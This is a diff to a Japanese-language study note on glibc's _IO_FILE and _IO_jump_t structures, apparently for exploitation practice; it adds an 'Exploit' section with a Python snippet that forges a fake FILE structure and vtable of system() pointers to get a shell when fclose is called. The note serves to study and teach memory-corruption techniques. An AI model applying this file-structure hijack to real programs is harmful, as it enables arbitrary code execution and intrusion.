@@ -119,3 +119,18 @@ _IO_jump_tのメモリダンプ
 0x7ffff7dd2730 <_IO_file_jumps+144>:	0x00007ffff7a89ec0	0x00007ffff7a8d840
 0x7ffff7dd2740 <_IO_file_jumps+160>:	0x00007ffff7a8d850	0x0000000000000000
 ```
+
+# Exploit
+* fpを上書きできる場合、_IO_FILEを偽装し、_IO_jump_tにsystem関数を仕込んでおくにより、fclose(fp)などが呼ばれた時にshellを取れる
+
+```
+    # fake _IO_FILE
+    buf += "/bin/sh\0"
+    buf += p(0)*16
+    buf += p(0x0000000000602000) # *_lock: any address may work
+    buf += p(0)*9
+    buf += p(fp_addr+len(buf)+8) # _IO_file_jumps addr
+    # fake _IO_file_jumps
+    buf += p(0)*2
+    buf += p(system)*19
+```
